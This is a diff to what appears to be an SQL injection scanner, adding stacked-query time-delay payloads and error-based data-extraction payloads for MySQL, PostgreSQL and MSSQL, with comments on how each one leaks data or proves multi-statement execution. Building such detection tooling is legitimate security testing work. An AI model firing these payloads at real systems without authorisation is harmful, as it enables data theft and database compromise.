@@ -109,6 +109,34 @@ TIME_BASED_POLYGLOTS = [
     "pg_sleep({s})/*' or pg_sleep({s}) or '\" or pg_sleep({s}) or \"*/",
 ]
 
+# Stacked-query time-based payloads: a ';' terminates the original statement and
+# runs a SECOND one. A delay here means the driver allows multiple statements
+# (stacked queries) — a stronger, RCE-adjacent capability (INSERT/UPDATE/DROP,
+# INTO OUTFILE, etc.). Appended to the original value. {s} = delay seconds.
+STACKED_TIME_TEMPLATES = [
+    "'; SELECT pg_sleep({s})-- -",
+    "1; SELECT pg_sleep({s})-- -",
+    "'; WAITFOR DELAY '0:0:{s}'-- -",
+    "'; SELECT SLEEP({s})-- -",
+    "1; SELECT SLEEP({s})-- -",
+]
+
+# Error-based EXTRACTION payloads: force the DB to leak data inside an error
+# message, proving exploitability and fingerprinting the engine. {q} is the
+# subquery to leak (default version()). Appended to the original value.
+ERROR_EXTRACT_TEMPLATES = [
+    # MySQL/MariaDB — XPATH errors echo the string between the ~ markers.
+    ("' AND extractvalue(1,concat(0x7e,({q}),0x7e))-- -", "mysql"),
+    ("' AND updatexml(1,concat(0x7e,({q}),0x7e),1)-- -", "mysql"),
+    (" AND extractvalue(1,concat(0x7e,({q}),0x7e))-- -", "mysql"),
+    # PostgreSQL — casting a text subquery to int leaks it in the error.
+    ("' AND 1=cast(({q}) as int)-- -", "postgresql"),
+    (" AND 1=cast(({q}) as int)-- -", "postgresql"),
+    ("' AND 1=({q})::int-- -", "postgresql"),
+    # MSSQL — conversion error leaks the value.
+    ("' AND 1=convert(int,({q}))-- -", "mssql"),
+]
+
 # Per-context time-based payloads (APPENDED to the original value) — fallback
 # after the polyglots for engines/contexts the polyglot doesn't cover (MSSQL
 # WAITFOR, stacked pg_sleep, etc.).
@@ -117,9 +145,7 @@ TIME_BASED_TEMPLATES = [
     " OR SLEEP({s})-- -",
     "' AND SLEEP({s})-- -",
     "'||pg_sleep({s})-- -",
-    "';SELECT pg_sleep({s})-- -",
-    "';WAITFOR DELAY '0:0:{s}'-- -",
-    "');WAITFOR DELAY '0:0:{s}'-- -",
+    "' OR pg_sleep({s})-- -",
     "' AND (SELECT {s} FROM (SELECT(SLEEP({s})))a)-- -",
 ]
 
